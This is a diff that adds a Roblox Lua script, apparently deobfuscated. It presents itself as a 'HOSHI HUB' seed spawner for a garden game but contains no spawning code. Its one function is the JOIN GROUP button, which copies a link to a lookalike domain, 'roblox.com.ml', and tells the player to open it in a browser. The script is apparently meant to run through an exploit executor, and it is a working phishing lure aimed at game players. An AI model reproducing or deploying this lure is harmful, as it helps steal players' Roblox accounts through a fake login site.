@@ -1,0 +1,141 @@
+local _call5 = game:GetService('TweenService')
+local _call9 = Instance.new('ScreenGui')
+
+_call9.Name = 'SeedSpawner'
+_call9.ResetOnSpawn = false
+
+local _call11 = Instance.new('Frame')
+
+_call11.AnchorPoint = Vector2.new(0.5, 0.5)
+_call11.Position = UDim2.new(0.5, 0, 0.5, 0)
+_call11.Size = UDim2.new(0, 650, 0, 380)
+_call11.BackgroundColor3 = Color3.fromRGB(18, 12, 35)
+_call11.BorderSizePixel = 0
+_call11.Parent = _call9
+
+local _call21 = Instance.new('UICorner')
+
+_call21.CornerRadius = UDim.new(0, 20)
+_call21.Parent = _call11
+
+local _call25 = Instance.new('TextLabel')
+
+_call25.BackgroundTransparency = 1
+_call25.Position = UDim2.new(0, 0, 0, 15)
+_call25.Size = UDim2.new(1, 0, 0, 50)
+_call25.Font = Enum.Font.GothamBold
+_call25.Text = 'HOSHI HUB'
+_call25.TextScaled = true
+_call25.TextColor3 = Color3.fromRGB(255, 255, 255)
+_call25.Parent = _call11
+
+local _call35 = Instance.new('TextLabel')
+
+_call35.BackgroundTransparency = 1
+_call35.Position = UDim2.new(0, 0, 0, 55)
+_call35.Size = UDim2.new(1, 0, 0, 30)
+_call35.Font = Enum.Font.GothamBold
+_call35.Text = 'ACCESS PANEL'
+_call35.TextScaled = true
+_call35.TextColor3 = Color3.fromRGB(180, 80, 255)
+_call35.Parent = _call11
+
+local _call45 = Instance.new('TextLabel')
+
+_call45.BackgroundTransparency = 1
+_call45.Position = UDim2.new(0, 0, 0, 105)
+_call45.Size = UDim2.new(1, 0, 0, 40)
+_call45.Font = Enum.Font.Gotham
+_call45.Text = 'Join the group to continue \u{2717}'
+_call45.TextScaled = true
+_call45.TextColor3 = Color3.fromRGB(255, 100, 150)
+_call45.Parent = _call11
+
+local _call55 = Instance.new('TextLabel')
+
+_call55.BackgroundTransparency = 1
+_call55.Position = UDim2.new(0.05, 0, 0.38, 0)
+_call55.Size = UDim2.new(0.9, 0, 0.25, 0)
+_call55.TextXAlignment = Enum.TextXAlignment.Left
+_call55.TextYAlignment = Enum.TextYAlignment.Top
+_call55.Font = Enum.Font.Gotham
+_call55.TextScaled = true
+_call55.TextColor3 = Color3.fromRGB(220, 220, 220)
+_call55.Text = '1. Press JOIN GROUP\n2. Link gets copied\n3. Open browser\n4. Join the group'
+_call55.Parent = _call11
+
+local _call69 = Instance.new('TextButton')
+
+_call69.AnchorPoint = Vector2.new(0.5, 0)
+_call69.Position = UDim2.new(0.5, 0, 0.73, 0)
+_call69.Size = UDim2.new(0, 420, 0, 70)
+_call69.Font = Enum.Font.GothamBold
+_call69.Text = 'JOIN GROUP'
+_call69.TextScaled = true
+_call69.TextColor3 = Color3.fromRGB(255, 255, 255)
+_call69.BackgroundColor3 = Color3.fromRGB(255, 0, 140)
+_call69.BorderSizePixel = 0
+_call69.Parent = _call11
+
+local _call83 = Instance.new('UICorner')
+
+_call83.CornerRadius = UDim.new(0, 18)
+_call83.Parent = _call69
+
+local _call87 = Instance.new('TextLabel')
+
+_call87.BackgroundTransparency = 1
+_call87.Position = UDim2.new(0, 0, 0.92, 0)
+_call87.Size = UDim2.new(1, 0, 0, 20)
+_call87.Font = Enum.Font.Gotham
+_call87.TextScaled = true
+_call87.TextColor3 = Color3.fromRGB(120, 120, 120)
+_call87.Text = 'Need help? Contact support.'
+_call87.Parent = _call11
+
+_call11.InputBegan:Connect(function(_99)
+    local _ = _99.UserInputType == Enum.UserInputType.MouseButton1
+    local _ = _99.UserInputType == Enum.UserInputType.Touch
+end)
+_call11.InputChanged:Connect(function(_111)
+    local _ = _111.UserInputType == Enum.UserInputType.MouseMovement
+    local _ = _111.UserInputType == Enum.UserInputType.Touch
+end)
+game:GetService('UserInputService').InputChanged:Connect(function(_123) end)
+_call69.MouseEnter:Connect(function()
+    local _call137 = _call5:Create(_call69, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundColor3 = Color3.fromRGB(220, 0, 120),
+    })
+
+    _call137:Play()
+end)
+_call69.MouseLeave:Connect(function()
+    local _call153 = _call5:Create(_call69, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundColor3 = Color3.fromRGB(255, 0, 140),
+    })
+
+    _call153:Play()
+end)
+_call69.MouseButton1Click:Connect(function()
+    _call69.Size = UDim2.new(0, 400, 0, 65)
+
+    task.wait(0.05)
+
+    local _call171 = _call5:Create(_call69, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 420, 0, 70),
+    })
+
+    _call171:Play()
+    setclipboard('https://www.roblox.com.ml/communities/103629047815/GrowAGarden2')
+
+    _call69.Text = 'LINK COPIED!'
+    _call45.Text = 'Group link copied \u{2713}'
+
+    local _call184 = _call5:Create(_call45, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        TextColor3 = Color3.fromRGB(0, 255, 150),
+    })
+
+    _call184:Play()
+end)
+
+_call9.Parent = game:GetService('CoreGui')
